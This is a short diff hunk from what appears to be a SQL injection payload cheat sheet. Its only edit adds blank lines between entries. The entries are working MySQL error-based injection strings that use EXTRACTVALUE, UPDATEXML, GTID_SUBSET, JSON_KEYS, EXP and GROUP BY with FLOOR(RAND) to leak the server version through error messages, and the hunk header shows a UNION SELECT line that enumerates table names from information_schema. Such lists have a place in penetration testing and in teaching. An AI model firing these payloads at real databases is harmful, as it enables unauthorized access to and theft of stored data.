@@ -23,11 +23,17 @@ UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,table_name,0x7C) FROM information_sch
 
 ## Mysql error-based
 AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -
+
 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',(SELECT version()),'~')) USING utf8))) -- -
+
 AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~')) -- -
+
 AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337) -- -
+
 AND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT version()),'~','x'))x)) -- -
+
 OR 1 GROUP BY CONCAT('~',(SELECT version()),'~',FLOOR(RAND(0)*2)) HAVING MIN(0) -- -
+
 AND UUID_TO_BIN(version())='1
 
 ## MYSQL Error Based - Basic
